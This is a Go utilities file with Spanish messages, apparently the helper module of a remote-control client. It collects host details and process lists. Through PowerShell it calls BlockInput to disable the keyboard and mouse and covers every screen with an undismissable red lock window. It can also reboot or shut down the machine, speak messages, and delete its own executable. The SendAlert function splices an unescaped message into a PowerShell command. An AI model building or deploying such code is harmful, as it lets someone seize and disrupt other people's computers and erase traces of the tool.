package utils

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func GetSystemInfo() (string, error) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("systeminfo")
	case "linux":
		cmd = exec.Command("uname", "-a")
	default:
		return "", fmt.Errorf("sistema operativo no soportado")
	}

	output, err := cmd.Output()
	if err != nil {
		return "", err
	}

	return string(output), nil
}

func GetOSDetails() map[string]string {
	details := make(map[string]string)

	details["OS"] = runtime.GOOS
	details["Arch"] = runtime.GOARCH

	hostname, _ := os.Hostname()
	details["Hostname"] = hostname

	return details
}

var isBlocked bool
var stopBlock chan bool

func BlockSystem(message string) error {
	if isBlocked {
		return fmt.Errorf("el sistema ya está bloqueado")
	}

	if message == "" {
		message = "SISTEMA BLOQUEADO"
	}

	stopBlock = make(chan bool)
	isBlocked = true

	if runtime.GOOS == "windows" {

		cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`
			Add-Type -AssemblyName System.Windows.Forms
			Add-Type -AssemblyName System.Drawing

			# Deshabilitar teclas especiales
			$code = @"
			using System;
			using System.Diagnostics;
			using System.Runtime.InteropServices;
			using System.Windows.Forms;

			public static class DisableKeys {
				[DllImport("user32.dll")]
				private static extern bool BlockInput(bool fBlockIt);

				public static void Block(bool block) {
					BlockInput(block);
				}
			}
"@

			Add-Type -TypeDefinition $code -Language CSharp
			[DisableKeys]::Block($true)

			$screens = [System.Windows.Forms.Screen]::AllScreens
			$forms = @()

			foreach ($screen in $screens) {
				$form = New-Object System.Windows.Forms.Form
				$form.StartPosition = 'Manual'
				$form.Location = $screen.Bounds.Location
				$form.Size = $screen.Bounds.Size
				$form.WindowState = 'Maximized'
				$form.FormBorderStyle = 'None'
				$form.BackColor = [System.Drawing.Color]::Red
				$form.TopMost = $true
				$form.Cursor = [System.Windows.Forms.Cursors]::None

				$form.KeyPreview = $true
				$form.Add_KeyDown({$_.Handled = $true})

				$label = New-Object System.Windows.Forms.Label
				$label.Text = "%s"
				$label.Font = New-Object System.Drawing.Font("Arial", 72, [System.Drawing.FontStyle]::Bold)
				$label.ForeColor = [System.Drawing.Color]::White
				$label.AutoSize = $true
				$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
				$label.Location = New-Object System.Drawing.Point(
					($form.Width - $label.Width) / 2,
					($form.Height - $label.Height) / 2
				)
				$form.Controls.Add($label)

				$form.Add_MouseDown({$_.Handled = $true})
				$form.Add_MouseUp({$_.Handled = $true})
				$form.Add_MouseMove({$_.Handled = $true})

				$forms += $form
			}

			foreach ($form in $forms) {
				$form.Show()
			}

			[System.Windows.Forms.Application]::Run($forms[0])
		`, message))
		cmd.Start()
	}

	go func() {
		for {
			select {
			case <-stopBlock:
				return
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()

	return nil
}

func UnblockSystem() {
	if isBlocked {
		close(stopBlock)
		isBlocked = false
	}
}

func SendAlert(message string) error {
	if message == "" {
		return fmt.Errorf("el mensaje no puede estar vacío")
	}

	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("powershell", "-Command", "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak('"+message+"')")
		return cmd.Run()
	case "linux":
		cmd := exec.Command("espeak", message)
		return cmd.Run()
	default:
		return fmt.Errorf("sistema operativo no soportado para TTS")
	}
}

func DeleteExecutable() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("error obteniendo la ruta del ejecutable: %v", err)
	}

	err = os.Remove(exePath)
	if err != nil {
		return fmt.Errorf("error eliminando el ejecutable: %v", err)
	}

	return nil
}

func LockPC() error {
	switch runtime.GOOS {
	case "windows":
		return exec.Command("rundll32.exe", "user32.dll,LockWorkStation").Run()
	case "linux":
		return exec.Command("xdg-screensaver", "lock").Run()
	default:
		return fmt.Errorf("sistema operativo no soportado para bloqueo de pantalla")
	}
}

func RebootPC() error {
	switch runtime.GOOS {
	case "windows":
		return exec.Command("shutdown", "/r", "/t", "0").Start()
	case "linux":
		return exec.Command("reboot").Start()
	default:
		return fmt.Errorf("sistema operativo no soportado para reinicio")
	}
}

func ShutdownPC() error {
	switch runtime.GOOS {
	case "windows":
		return exec.Command("shutdown", "/s", "/t", "0").Start()
	case "linux":
		return exec.Command("shutdown", "-h", "now").Start()
	default:
		return fmt.Errorf("sistema operativo no soportado para apagado")
	}
}

func ListProcesses() ([]string, error) {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = exec.Command("tasklist", "/fo", "csv", "/nh").Output()
		if err != nil {
			return nil, err
		}
		lines := strings.Split(string(out), "\n")
		var procs []string
		for i, line := range lines {
			if i >= 20 {
				break
			}
			fields := strings.Split(line, ",")
			if len(fields) > 0 {
				procs = append(procs, strings.Trim(fields[0], "\""))
			}
		}
		return procs, nil
	} else {
		out, err = exec.Command("ps", "-e", "-o", "comm=").Output()
		if err != nil {
			return nil, err
		}
		lines := strings.Split(string(out), "\n")
		if len(lines) > 20 {
			lines = lines[:20]
		}
		return lines, nil
	}
}

func BasicSystemStatus() string {
	hostname, _ := os.Hostname()
	return fmt.Sprintf("Hostname: %s\nOS: %s\nArch: %s\n", hostname, runtime.GOOS, runtime.GOARCH)
}
